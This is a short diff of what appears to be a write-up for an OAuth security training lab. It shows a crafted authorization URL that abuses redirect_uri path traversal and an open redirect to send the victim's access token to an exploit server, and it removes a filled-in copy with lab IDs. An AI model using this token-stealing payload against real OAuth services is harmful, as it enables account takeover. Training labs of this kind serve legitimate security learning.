@@ -157,10 +157,6 @@ https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth
 https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email
 ```
 
-```
-https://oauth-0a20003b04f9d7a18192826a025800cb.oauth-server.net/auth?client_id=syz05oycr3dnqgg4tjz86&redirect_uri=https://0a86004a043cd73c817a842700f30087.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0aa6000e04ead78e810483a701f400d5.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email
-```
-
 
 ### Step 5.3: Test the URL
 
